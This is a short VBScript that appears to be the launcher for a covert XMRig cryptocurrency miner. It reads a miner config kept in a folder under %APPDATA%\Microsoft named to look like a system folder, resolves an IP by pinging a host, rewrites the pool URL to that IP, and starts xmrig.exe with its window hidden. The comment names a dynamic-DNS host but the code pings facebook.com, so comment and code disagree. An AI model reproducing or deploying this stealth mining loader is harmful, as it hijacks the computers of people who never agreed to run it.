Option Explicit

Dim objFSO, objShell, jsonFilePath, jsonContent, objFile, pingResult, ipAddress
Dim regex, matches, updatedContent, xmrigPath

' Initialize file system and shell objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Define the paths
jsonFilePath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
xmrigPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\xmrig.exe")

' Check if config.json exists
If Not objFSO.FileExists(jsonFilePath) Then
    WScript.Quit
End If

' Ping myhost.no-ip.com to get the current IP address
Dim objExec
Set objExec = objShell.Exec("ping -n 1 facebook.com")
Do While objExec.Status = 0
    WScript.Sleep 100
Loop

pingResult = objExec.StdOut.ReadAll

' Extract the IP address from the ping result
Set regex = New RegExp
regex.Pattern = "\b\d{1,3}(\.\d{1,3}){3}\b" ' Matches IPv4 addresses
regex.Global = False
Set matches = regex.Execute(pingResult)

If matches.Count > 0 Then
    ipAddress = matches(0).Value
Else
    WScript.Quit
End If

' Read the current content of config.json
Set objFile = objFSO.OpenTextFile(jsonFilePath, 1, False)
jsonContent = objFile.ReadAll
objFile.Close

' Replace only the hostname in the "url" field, keeping the port intact
regex.Pattern = """url"":\s*""[^:]+(:\d+)"""
updatedContent = regex.Replace(jsonContent, """url"": """ & ipAddress & "$1""")

' Write the updated content back to config.json
Set objFile = objFSO.OpenTextFile(jsonFilePath, 2, False)
objFile.Write updatedContent
objFile.Close

' Launch xmrig.exe silently if it exists
If objFSO.FileExists(xmrigPath) Then
    objShell.Run """" & xmrigPath & """", 0, False
End If
